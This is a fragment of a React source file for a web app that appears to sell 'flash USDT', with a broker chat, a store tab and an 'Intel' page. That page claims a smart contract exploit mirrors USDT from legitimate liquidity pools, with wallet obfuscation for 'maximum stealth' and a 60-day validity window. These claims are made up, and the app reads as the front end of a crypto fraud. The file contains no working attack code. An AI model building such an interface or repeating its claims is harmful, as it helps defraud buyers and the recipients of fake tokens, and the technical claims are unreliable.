            <div className="flex gap-2 items-center bg-black border border-[#00FF41]/30 p-1 rounded-full px-4">
              <input 
                type="text" 
                value={chatInput}
                onChange={e => setChatInput(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleSendMessage()}
                className="flex-1 bg-transparent border-none outline-none p-3 text-[#00FF41] placeholder-[#00FF41]/30 text-xs"
                placeholder="Ask about technical voids..."
              />
              <button onClick={handleSendMessage} disabled={isTyping || !chatInput.trim()} className="text-[#00FF41] p-2 disabled:opacity-30">
                <Send size={18} />
              </button>
            </div>
          </div>
        )}

        {activeTab === 'protocol' && (
           <div className="p-4 md:p-8 max-w-4xl mx-auto space-y-12 pb-12">
             <div className="border-l-4 border-white pl-6 py-2">
                <h2 className="text-3xl font-black uppercase tracking-tighter text-white">Technical Specs</h2>
                <p className="text-xs text-[#00FF41] uppercase tracking-widest mt-1">Protocol Architecture</p>
             </div>
             <section className="space-y-6">
                <div className="flex items-center gap-3 text-white border-b border-white/10 pb-2">
                   <Layers size={20} className="text-[#00FF41]" />
                   <h3 className="text-lg font-bold uppercase tracking-widest">Core Mechanisms</h3>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-8 text-sm leading-relaxed text-[#00FF41]/80">
                   <p>Flash injection utilizes an advanced smart contract exploit where temporary assets are mirrored from legitimate USDT liquidity pools. By shadowing the main contract, our assets remain visible to all public explorers.</p>
                   <p>The obfuscation layer ensures that your wallet's off-chain fingerprint is scrubbed before any asset reflection occurs, ensuring maximum stealth during the 60-day validity window.</p>
                </div>
             </section>
           </div>
        )}
      </main>

      <nav className="z-50 shrink-0 bg-black/95 border-t border-white/10 flex justify-around items-center px-4 backdrop-blur-md safe-area-inset-bottom">
        <TabButton active={activeTab === 'dash'} onClick={() => setActiveTab('dash')} icon={<Cpu />} label="Main" />
        <TabButton active={activeTab === 'live'} onClick={() => setActiveTab('live')} icon={<History />} label="Live" />
        <div className="relative -top-4">
           <button onClick={() => setActiveTab('store')} className={`p-4 rounded-full border-2 transition-all shadow-[0_0_20px_rgba(0,255,65,0.2)] ${activeTab === 'store' ? 'bg-[#00FF41] border-white text-black scale-110' : 'bg-black border-[#00FF41] text-[#00FF41]'}`}>
              <Zap size={24} />
           </button>
        </div>
        <TabButton active={activeTab === 'chat'} onClick={() => setActiveTab('chat')} icon={<MessageSquare />} label="Broker" />
        <TabButton active={activeTab === 'protocol'} onClick={() => setActiveTab('protocol')} icon={<BookOpen />} label="Intel" />
      </nav>

      <style>{`
        @keyframes ticker {
          0% { transform: translateX(0); }
          100% { transform: translateX(-50%); }
        }
        .safe-area-inset-bottom {
          padding-bottom: env(safe-area-inset-bottom);
        }
        .scrollbar-hide::-webkit-scrollbar {
          display: none;
        }
        .scrollbar-hide {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>
    </div>
  );
};

const root = createRoot(document.getElementById('root')!);
root.render(<App />);
